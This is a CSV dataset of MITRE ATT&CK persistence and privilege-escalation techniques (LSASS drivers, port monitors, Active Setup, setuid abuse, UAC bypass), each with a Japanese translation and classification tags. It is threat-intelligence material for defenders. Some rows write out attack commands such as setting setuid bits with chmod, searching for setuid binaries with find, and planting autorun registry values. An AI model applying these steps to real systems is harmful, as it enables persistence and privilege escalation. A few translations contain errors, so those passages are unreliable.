T1547.008,T1547,LSASS Driver,LSASS ドライバー,"Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem) Adversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.",攻撃者は、侵害されたシステム上で永続性を得るためにLSASSドライバを改変または追加する可能性があります。Windowsセキュリティサブシステムは、コンピューターまたはドメインのセキュリティポリシーを管理・強制する一連のコンポーネントです。ローカルセキュリティ機関（LSA）は、ローカルセキュリティポリシーとユーザー認証を担当する主要コンポーネントです。 LSAには、他の様々なセキュリティ機能に関連する複数のダイナミックリンクライブラリ（DLL）が含まれており、これらはすべてLSAサブシステムサービス（LSASS）lsass.exeプロセスのコンテキストで実行されます。（引用元：Microsoft Security Subsystem）攻撃者は、永続性を得るためにLSASSドライバを標的にする可能性があります。 不正なドライバの置換または追加（例：[実行フローのハイジャック](https://attack.mitre.org/techniques/T1574)）により、攻撃者は LSA 操作を利用して悪意のあるペイロードを継続的に実行できます。,persistence;privilege-escalation,Windows,config_policy_manipulation,privilege_gain,authentication_system;user_interaction;endpoint_execution;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--f0589bc3-a6ae-425a-a3d5-5659bfee07f4,2020-01-24T18:38:55.801Z,2025-04-16T20:37:22.686Z,,,,
T1547.009,T1547,Shortcut Modification,ショートカットの変更,"Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process. Adversaries may abuse shortcuts in the startup folder to execute their tools and achieve persistence.(Citation: Shortcut for Persistence ) Although often used as payloads in an infection chain (e.g. [Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001)), adversaries may also create a new shortcut as a means of indirection, while also abusing [Masquerading](https://attack.mitre.org/techniques/T1036) to make the malicious shortcut appear as a legitimate program. Adversaries can also edit the target path or entirely replace an existing shortcut so their malware will be executed instead of the intended legitimate program. Shortcuts can also be abused to establish persistence by implementing other methods. For example, LNK browser extensions may be modified (e.g. [Browser Extensions](https://attack.mitre.org/techniques/T1176/001)) to persistently launch malware.",攻撃者は、システム起動時またはユーザーログイン時にプログラムを実行するショートカットを作成または変更する可能性があります。ショートカットやシンボリックリンクは、クリック時またはシステム起動プロセスによって実行された際に開かれる/実行される他のファイルやプログラムを参照するために使用されます。攻撃者はスタートアップフォルダ内のショートカットを悪用し、自身のツールを実行して永続化を達成することがあります。(引用: Shortcut for Persistence ) 感染チェーンにおけるペイロードとして頻繁に使用される一方（例: [スピアフィッシング添付ファイル](https://attack.mitre.org/techniques/T1566/001))でペイロードとして使用されることが多いが、攻撃者は間接的な手段として新規ショートカットを作成し、[偽装](https://attack.mitre.org/techniques/T1036)を悪用して悪意のあるショートカットを正当なプログラムに見せかける場合もある。 攻撃者は、ターゲットパスを編集したり既存のショートカットを完全に置き換えたりすることで、意図された正当なプログラムの代わりにマルウェアを実行させることも可能です。ショートカットは他の手法を実装することで永続化を確立するためにも悪用されます。例えば、LNKブラウザ拡張機能（例：[Browser Extensions](https://attack.mitre.org/techniques/T1176/001)）を改変し、マルウェアを永続的に起動させるケースがあります。,persistence;privilege-escalation,Windows,other,privilege_gain,authentication_system;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--4ab929c6-ee2d-4fb5-aab4-b14be2ed7179,2020-01-24T19:00:32.917Z,2025-04-15T19:58:28.507Z,,,,
T1547.010,T1547,Port Monitors,ポートモニター,"Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\Windows\System32</code> and will be loaded and run by the print spooler service, `spoolsv.exe`, under SYSTEM level permissions on boot.(Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to the `Driver` value of an existing or new arbitrarily named subkey of <code>HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors</code>. The Registry key contains entries for the following: * Local Port * Standard TCP/IP Port * USB Monitor * WSD Port",攻撃者は、永続化や権限昇格のために、システム起動時に攻撃者が提供するDLLを実行するポートモニターを使用することがあります。 ポートモニターは<code>AddMonitor</code> API呼び出しにより設定可能で、起動時にDLLをロードするように設定される。(引用: AddMonitor) このDLLは<code>C:\Windows\System32</code>に配置され、起動時にSYSTEMレベルの権限でプリントスプーラーサービス`spoolsv.exe`によってロード・実行される。(引用: Bloxham) あるいは、既存または新規に任意の名前で作成したサブキー <code>HKLM\SYSTEM\CurrentControlSet\Control\Print\Monitors</code> の `Driver` 値に、その DLL の完全修飾パス名を書き込む権限があれば、任意の DLL をロードできます。レジストリキーには以下のエントリが含まれます: * ローカルポート * 標準 TCP/IP ポート * USB モニター * WSD ポート,persistence;privilege-escalation,Windows,config_policy_manipulation,privilege_gain,cloud_control_plane;logging_monitoring,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--43881e51-ac74-445b-b4c6-f9f9e9bf23fe,2020-01-24T19:46:27.750Z,2025-04-15T19:58:26.452Z,,,,
T1547.011,,Plist Modification,Plist 変更,"Adversaries can modify property list files (plist files) to execute their code as part of establishing persistence. Plist files are used by macOS applications to store properties and configuration settings for applications and services. Applications use information plist files, <code>Info.plist</code>, to tell the operating system how to handle the application at runtime using structured metadata in the form of keys and values. Plist files are formatted in XML and based on Apple's Core Foundation DTD and can be saved in text or binary format.(Citation: fileinfo plist file description) Adversaries can modify paths to executed binaries, add command line arguments, and insert key/pair values to plist files in auto-run locations which execute upon user logon or system startup. Through modifying plist files in these locations, adversaries can also execute a malicious dynamic library (dylib) by adding a dictionary containing the <code>DYLD_INSERT_LIBRARIES</code> key combined with a path to a malicious dylib under the <code>EnvironmentVariables</code> key in a plist file. Upon user logon, the plist is called for execution and the malicious dylib is executed within the process space. Persistence can also be achieved by modifying the <code>LSEnvironment</code> key in the application's <code>Info.plist</code> file.(Citation: wardle artofmalware volume1)",攻撃者は、永続化確立の一環としてプロパティリストファイル（plistファイル）を改変し、自身のコードを実行できる。plistファイルはmacOSアプリケーションがアプリケーションやサービスのプロパティおよび設定を保存するために使用する。アプリケーションは情報plistファイル<code>Info.plist</code>を用い、キーと値の形式で構造化されたメタデータを通じて、実行時にオペレーティングシステムがアプリケーションをどのように扱うかを指示する。 plistファイルはXML形式で記述され、AppleのCore Foundation DTDに基づいています。テキスト形式またはバイナリ形式で保存可能です。（出典: fileinfo plistファイルの説明）攻撃者は、ユーザーログオン時やシステム起動時に実行される自動実行場所にあるplistファイルに対し、実行バイナリのパス変更、コマンドライン引数の追加、キー/値ペアの挿入を行うことができます。 これらの場所のplistファイルを改変することで、攻撃者は悪意のあるダイナミックライブラリ（dylib）を実行することも可能です。具体的には、plistファイル内の<code>EnvironmentVariables</code>キー下に、<code>DYLD_INSERT_LIBRARIES</code>キーと悪意のあるdylibへのパスを含む辞書を追加します。ユーザーログオン時にplistが呼び出され、悪意のあるdylibがプロセス空間内で実行されます。 また、アプリケーションの<code>Info.plist</code>ファイル内の<code>LSEnvironment</code>キーを変更することで、永続化を実現することも可能です。(引用: wardle artofmalware volume1),persistence;privilege-escalation,macOS,script_command_execution,privilege_gain,user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),revoked;subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--6747daa2-3533-4e78-8fb8-446ebb86448a,2020-01-24T20:02:59.149Z,2025-04-18T17:59:20.958Z,,,,
T1547.012,T1547,Print Processors,プリントプロセッサ,"Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors) Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\SYSTEM\\[CurrentControlSet or ControlSet001]\Control\Print\Environments\\[Windows architecture: e.g., Windows x64]\Print Processors\\[user defined]\Driver</code> Registry key that points to the DLL. For the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020) The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.",攻撃者は、永続化や権限昇格のために、システム起動時に悪意のあるDLLを実行するためにプリントプロセッサを悪用する可能性があります。プリントプロセッサは、起動時にプリントスプーラサービス`spoolsv.exe`によってロードされるDLLです。(引用元: Microsoft Intro Print Processors) 攻撃者は、起動時に悪意のあるDLLをロードするプリントプロセッサを追加することで、プリントスプーラサービスを悪用する可能性があります。 <code>AddPrintProcessor</code> API 呼び出しにより、<code>SeLoadDriverPrivilege</code> が有効なアカウントでプリントプロセッサをインストールできます。 あるいは、DLLを指す<code>HKLM\SYSTEM\\[CurrentControlSet または ControlSet001]\Control\Print\Environments\\[Windows アーキテクチャ: 例: Windows x64]\Print Processors\\[ユーザー定義]\Driver</code>レジストリキーを追加することで、印刷プロセッサを印刷スプーラサービスに登録できます。 悪意のあるプリントプロセッサを正しくインストールするには、ペイロードを専用のシステムプリントプロセッサディレクトリに配置する必要があります。このディレクトリは<code>GetPrintProcessorDirectory</code> API呼び出しで取得するか、このディレクトリからの相対パスで参照できます。(引用元: Microsoft AddPrintProcessor May 2018) プリントプロセッサがインストールされた後、起動時に開始されるプリントスプーラサービスを再起動する必要があります。(引用元: ESET PipeMon 2020年5月) プリントスプーラサービスはSYSTEMレベルの権限で実行されるため、攻撃者によってインストールされたプリントプロセッサは昇格された権限で実行される可能性があります。,persistence;privilege-escalation,Windows,config_policy_manipulation,privilege_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--2de47683-f398-448f-b947-9abcc3e32fad,2020-10-05T13:24:49.780Z,2025-04-15T19:58:17.860Z,,,,
T1547.013,T1547,XDG Autostart Entries,XDG自動起動エントリ,"Adversaries may add or modify XDG Autostart Entries to execute malicious programs or commands when a user’s desktop environment is loaded at login. XDG Autostart entries are available for any XDG-compliant Linux system. XDG Autostart entries use Desktop Entry files (`.desktop`) to configure the user’s desktop environment upon user login. These configuration files determine what applications launch upon user login, define associated applications to open specific file types, and define applications used to open removable media.(Citation: Free Desktop Application Autostart Feb 2006)(Citation: Free Desktop Entry Keys) Adversaries may abuse this feature to establish persistence by adding a path to a malicious binary or command to the `Exec` directive in the `.desktop` configuration file. When the user’s desktop environment is loaded at user login, the `.desktop` files located in the XDG Autostart directories are automatically executed. System-wide Autostart entries are located in the `/etc/xdg/autostart` directory while the user entries are located in the `~/.config/autostart` directory. Adversaries may combine this technique with [Masquerading](https://attack.mitre.org/techniques/T1036) to blend malicious Autostart entries with legitimate programs.(Citation: Red Canary Netwire Linux 2022)",攻撃者は、ユーザーのデスクトップ環境がログイン時に読み込まれる際に悪意のあるプログラムやコマンドを実行するため、XDG自動起動エントリを追加または変更する可能性があります。XDG自動起動エントリは、XDG準拠のLinuxシステムで利用可能です。XDG自動起動エントリは、ユーザーログイン時にデスクトップ環境を設定するためにデスクトップエントリファイル（`.desktop`）を使用します。 これらの設定ファイルは、ユーザーログイン時に起動するアプリケーションを決定し、特定のファイルタイプを開くための関連アプリケーションを定義し、リムーバブルメディアを開くために使用されるアプリケーションを定義します。（引用: Free Desktop Application Autostart Feb 2006）（引用: Free Desktop Entry Keys）攻撃者は、`.desktop`設定ファイルの`Exec`ディレクティブに悪意のあるバイナリやコマンドへのパスを追加することで、この機能を悪用し永続性を確立する可能性があります。 ユーザーログイン時にデスクトップ環境が読み込まれる際、XDG自動起動ディレクトリ内の`.desktop`ファイルが自動的に実行されます。システム全体の自動起動エントリは`/etc/xdg/autostart`ディレクトリに、ユーザーエントリは`~/.config/autostart`ディレクトリに配置されます。 攻撃者はこの手法を[偽装](https://attack.mitre.org/techniques/T1036)と組み合わせて、悪意のある自動起動エントリを正当なプログラムに紛れ込ませることがあります。（引用元: Red Canary Netwire Linux 2022）,persistence;privilege-escalation,Linux,script_command_execution,privilege_gain,authentication_system;user_interaction;endpoint_execution;file_storage_access;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--e0232cb0-ded5-4c2e-9dc7-2893142a5c11,2019-09-10T18:13:12.195Z,2025-04-15T19:59:14.885Z,,,,
T1547.014,T1547,Active Setup,Active Setup,"Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level. Adversaries may abuse Active Setup by creating a key under <code> HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation: paloalto Tropic Trooper 2016) Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.",攻撃者は、ローカルマシンのアクティブセットアップにレジストリキーを追加することで永続化を達成する可能性があります。アクティブセットアップは、ユーザーがログオンした際にプログラムを実行するために使用されるWindowsのメカニズムです。レジストリキーに格納された値は、ユーザーがコンピュータにログオンした後に実行されます。(引用: Klein Active Setup 2010) これらのプログラムはユーザーのコンテキストで実行され、アカウントに関連付けられた権限レベルを持ちます。 攻撃者は<code>HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\</code>配下にキーを作成し、<code>StubPath</code>に悪意のある値を設定することでActive Setupを悪用する可能性がある。この値はユーザーがコンピュータにログインした際に実行されるプログラムとして機能する。(引用: Mandiant Glyer APT 2010)(引用元: Citizenlab Packrat 2015)(引用元: FireEye CFR Watering Hole 2012)(引用元: SECURELIST Bright Star 2015)(引用元: paloalto Tropic Trooper 2016)攻撃者はこれらのコンポーネントを悪用し、リモートアクセスツールなどのマルウェアを実行することで、システム再起動後も持続性を維持できます。 また、[偽装](https://attack.mitre.org/techniques/T1036) を使用して、レジストリエントリを正当なプログラムに関連付けられているように見せかける場合もある。,persistence;privilege-escalation,Windows,config_policy_manipulation,privilege_gain,authentication_system;user_interaction;endpoint_execution;network_connectivity;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--22522668-ddf6-470b-a027-9d6866679f67,2020-12-18T16:33:13.098Z,2025-04-15T19:58:13.464Z,,,,
T1547.015,T1547,Login Items,ログイン項目,"Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.(Citation: Open Login Items Apple) Login items can be added via a shared file list or Service Management Framework.(Citation: Adding Login Items) Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>. Login items installed using the Service Management Framework leverage <code>launchd</code>, are not visible in the System Preferences, and can only be removed by the application that created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled Schroeder 2013) Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.(Citation: Launch Services Apple Developer) Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications. Adversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) and [Native API](https://attack.mitre.org/techniques/T1106) calls to create a login item to spawn malicious executables.(Citation: ELC Running at startup) Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002) to send an Apple events to the “System Events Eprocess, which has an AppleScript dictionary for manipulating login items.(Citation: Login Items AE) Adversaries can use a command such as <code>tell application “System Events Eto make login item at end with properties /path/to/executable</code>.(Citation: Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add List Remove Login Items Apple Script) This command adds the path of the malicious executable to the login item file list located in <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>.(Citation: Startup Items Eclectic) Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.(Citation: objsee mac malware 2017)(Citation: CheckPoint Dok)(Citation: objsee netwire backdoor 2019)",攻撃者は、永続化や権限昇格を目的として、ユーザーログイン時に実行されるログイン項目を追加する場合があります。ログイン項目とは、ユーザーログイン時に自動的に起動されるアプリケーション、ドキュメント、フォルダ、またはサーバー接続を指します。(引用元: Open Login Items Apple) ログイン項目は、共有ファイルリストやサービス管理フレームワークを介して追加できます。(引用元: Adding Login Items) 共有ファイルリストのログイン項目は[AppleScript](https://attack.mitre.org/techniques/T1059/002)などのスクリプト言語で設定可能ですが、サービス管理フレームワークでは<code>SMLoginItemSetEnabled</code> API呼び出しを使用します。 サービス管理フレームワークを使用してインストールされたログイン項目は<code>launchd</code>を利用し、システム環境設定には表示されず、作成したアプリケーションによってのみ削除できます。(引用: ログイン項目の追加)(引用: SMLoginItemSetEnabled Schroeder 2013) 共有ファイルリストを使用して作成されたログイン項目は、システム環境設定に表示され、起動時にアプリケーションを非表示にすることができ、Finder を使用せずにアプリケーション、ドキュメント、または URL を開くために launchd ではなく LaunchServices を通じて実行されます。(引用: Launch Services Apple Developer) ユーザーやアプリケーションは、ログイン項目を使用して、電子メール、チャット、音楽アプリケーションなど、よく使用するサービスやアプリケーションを起動するユーザー環境を設定します。 攻撃者は[AppleScript](https://attack.mitre.org/techniques/T1059/002)や[ネイティブAPI](https://attack.mitre.org/techniques/T1106)呼び出しを利用して、悪意のある実行ファイルを生成するログイン項目を作成できます。(引用: ELC 起動時に実行) macOS バージョン 10.5 以前では、攻撃者は [AppleScript](https://attack.mitre.org/techniques/T1059/002) を使用して「システムイベント Eprocess」に Apple イベントを送信し、ログイン項目を操作するための AppleScript 辞書を利用してログイン項目を追加することができます。(引用: Login Items AE) 攻撃者は、<code>tell application “System Events Eto make login item at end with properties /path/to/executable</code> などのコマンドを使用できます。(引用: Startup Items Eclectic)(引用: hexed osx.dok analysis 2019)(引用: Add List Remove Login Items Apple Script) このコマンドは、悪意のある実行ファイルのパスを、<code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code> にあるログイン項目ファイルリストに追加します。(引用元: Startup Items Eclectic) 攻撃者は、ログイン項目を使用して、被害者のシステムをリモートで制御したり、ユーザーの認証情報を要求して特権昇格を行う手段として使用できる実行ファイルを起動することもできます。(引用元: objsee mac malware 2017)(引用元: CheckPoint Dok)(引用元: objsee netwire backdoor 2019),persistence;privilege-escalation,macOS,credential_abuse,privilege_gain,authentication_system;user_interaction;endpoint_execution;network_connectivity;email_infrastructure;cloud_control_plane;file_storage_access;logging_monitoring,specified,Business Workstation;File Server;Log / Monitoring Server;Mail / Collaboration;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S2;S3,S2,C02;C03,Secondary Action;Secondary Intrusion,C02,Secondary Action,TA0003;TA0004,attack-pattern--84601337-6a55-4ad7-9c35-79e0d1ea2ab3,2021-10-05T21:26:15.081Z,2025-04-15T19:58:47.788Z,,,,
T1548,,Abuse Elevation Control Mechanism,昇格制御メカニズムの悪用,Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk.(Citation: TechNet How UAC Works)(Citation: sudo man page 2018) An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.(Citation: OSX Keydnap malware)(Citation: Fortinet Fareit),攻撃者は、より高いレベルの権限を取得するために、特権昇格を制御するメカニズムを回避する可能性があります。ほとんどの現代システムには、ユーザーがマシン上で実行できる権限を制限することを目的としたネイティブな昇格制御メカニズムが含まれています。 よりリスクの高いとみなされるタスクを実行するには、特定のユーザーに権限を付与する必要があります。（引用元：TechNet How UAC Works）（引用元：sudo man page 2018）攻撃者は、システム上で権限昇格を行うために、組み込みの制御メカニズムを悪用するいくつかの手法を実行できます。（引用元：OSX Keydnap malware）（引用元：Fortinet Fareit）,privilege-escalation;defense-evasion,Linux;macOS;Windows;IaaS;Office Suite;Identity Provider,other,privilege_gain,user_interaction,specified,Business Workstation;Identity / SaaS (IdP/SSO);Management Console for GovCloud;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0005,attack-pattern--67720091-eee3-4d2d-ae16-8264567f6f5b,2020-01-30T13:58:14.373Z,2025-04-15T19:58:37.690Z,,,,
T1548.001,T1548,Setuid and Setgid,Setuid と Setgid,"An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.(Citation: setuid man page) Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges. Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e. [Linux and Mac File and Directory Permissions Modification](https://attack.mitre.org/techniques/T1222/002)). The <code>chmod</code> command can set these bits with bitmasking, <code>chmod 4777 [file]</code> or via shorthand naming, <code>chmod u+s [file]</code>. This will enable the setuid bit. To enable the setgid bit, <code>chmod 2775</code> and <code>chmod g+s</code> can be used. Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.(Citation: OSX Keydnap malware) This abuse is often part of a ""shell escape"" or other actions to bypass an execution environment with restricted permissions. Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e. [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)). The setuid and setguid bits are indicated with an ""s"" instead of an ""x"" when viewing a file's attributes via <code>ls -l</code>. The <code>find</code> command can also be used to search for such files. For example, <code>find / -perm +4000 2>/dev/null</code> can be used to find files with setuid set and <code>find / -perm +2000 2>/dev/null</code> may be used for setgid. Binaries that have these bits set may then be abused by adversaries.(Citation: GTFOBins Suid)",攻撃者は、アプリケーションにsetuidビットまたはsetgidビットが設定されている構成を悪用し、異なる（かつより特権的な可能性のある）ユーザーのコンテキストでコードを実行させることがある。 Linux または macOS では、アプリケーションバイナリに setuid ビットまたは setgid ビットが設定されている場合、アプリケーションはそれぞれ所有ユーザーまたはグループの特権で実行される。(引用: setuid マニュアルページ) 通常、アプリケーションは、アプリケーションの所有ユーザーまたはグループに関係なく、現在のユーザーのコンテキストで実行される。しかし、プログラムが正常に機能するために昇格されたコンテキストで実行される必要があるが、それを実行するユーザーが特定の必要な特権を持っていない場合がある。 root権限が必要なsudoersファイルへのエントリ作成に代え、任意のユーザーが自身のアプリケーションに対してsetuidまたはsetgidフラグの設定を指定できます（例：[LinuxおよびMacにおけるファイル・ディレクトリ権限の変更](https://attack.mitre.org/techniques/T1222/002)）。 <code>chmod</code>コマンドでは、ビットマスク指定（例：<code>chmod 4777 [ファイル]</code>）または省略形（例：<code>chmod u+s [ファイル]</code>）でこれらのビットを設定できます。これによりsetuidビットが有効化されます。 setgidビットを有効化するには、<code>chmod 2775</code> および <code>chmod g+s</code> が使用可能です。攻撃者はこのメカニズムを自身のマルウェアに適用し、将来的に昇格されたコンテキストで実行可能であることを保証できます（引用元: OSX Keydnapマルウェア）。この悪用は、しばしば「シェルエスケープ」や、制限された権限を持つ実行環境を迂回するその他のアクションの一部となります。 あるいは、攻撃者は既にsetuid/setgidビットが有効化された脆弱なバイナリを特定して標的とする場合もある（例：[ファイルとディレクトリの発見](https://attack.mitre.org/techniques/T1083)）。 setuid および setguid ビットは、<code>ls -l</code> でファイルの属性を表示する際に「x」ではなく「s」で示されます。<code>find</code> コマンドも、そのようなファイルを検索するために使用できます。 例えば、<code>find / -perm +4000 2>/dev/null</code> は setuid が設定されたファイルを検索し、<code>find / -perm +2000 2>/dev/null</code> は setgid を検索します。これらのビットが設定されたバイナリは、攻撃者によって悪用される可能性があります。(引用元: GTFOBins Suid),privilege-escalation;defense-evasion,Linux;macOS,script_command_execution,privilege_gain,privileged_account;user_interaction;endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3;S2,S2,C03;C02,Secondary Intrusion;Secondary Action,C02,Secondary Action,TA0004;TA0005,attack-pattern--6831414d-bb70-42b7-8030-d4e06b2660c9,2020-01-30T14:11:41.212Z,2025-04-16T20:37:17.707Z,,,,
T1548.002,T1548,Bypass User Account Control,ユーザー アカウント制御のバイパス,"Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.(Citation: TechNet How UAC Works) If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) objects without prompting the user through the UAC notification box.(Citation: TechNet Inside UAC)(Citation: MSDN COM Elevation) An example of this is use of [Rundll32](https://attack.mitre.org/techniques/T1218/011) to load a specifically crafted DLL which loads an auto-elevated [Component Object Model](https://attack.mitre.org/techniques/T1559/001) object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.(Citation: Davidson Windows) Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods(Citation: Github UACMe) that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as: * <code>eventvwr.exe</code> can auto-elevate and execute a specified binary or script.(Citation: enigma0x3 Fileless UAC Bypass)(Citation: Fortinet Fareit) Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.(Citation: SANS UAC Bypass)",攻撃者はUACメカニズムを迂回し、システム上でプロセスの特権を昇格させる可能性がある。 Windowsユーザーアカウント制御（UAC）は、プログラムが特権（低から高までの整合性レベルとして追跡）を昇格させ、管理者レベルの権限でタスクを実行することを許可します。これにはユーザーへの確認プロンプトが表示される場合があります。ユーザーへの影響は、高強制レベルでは操作を拒否する一方、ローカル管理者グループに属するユーザーがプロンプトをクリックして操作を許可する場合や、管理者パスワードを入力して操作を完了させる場合などがあります。(引用元: TechNet UACの仕組み) コンピュータのUAC保護レベルが最高レベル以外の場合、特定のWindowsプログラムは、ユーザーにUAC通知ボックスを表示することなく、権限を昇格させたり、一部の昇格された[コンポーネントオブジェクトモデル](https://attack.mitre.org/techniques/T1559/001)オブジェクトを実行したりできます。(引用元: TechNet UACの内部)(引用元: MSDN COM昇格) その一例として、 [Rundll32](https://attack.mitre.org/techniques/T1218/011) を使用して、特別に細工された DLL をロードし、自動昇格された [Component Object Model](https://attack.mitre.org/techniques/T1559/001) オブジェクトをロードし、通常は昇格されたアクセスを必要とする保護されたディレクトリ内でファイル操作を実行するケースが挙げられます。 悪意のあるソフトウェアは、ユーザーに確認を促すことなく特権昇格を得るため、信頼されたプロセスに注入される場合もある（引用元: Davidson Windows）。UACをバイパスする多くの手法が発見されている。 UACMEのGitHub READMEページには、発見・実装済みの手法が網羅的に記載されているが（引用元: Github UACMe）、回避手法の完全なリストではない可能性がある。追加の回避手法は定期的に発見され、実環境で使用されるものもある。例：* <code>eventvwr.exe</code> は自動昇格が可能で、指定されたバイナリやスクリプトを実行できる。(引用元: enigma0x3 Fileless UAC Bypass)(引用元: Fortinet Fareit) 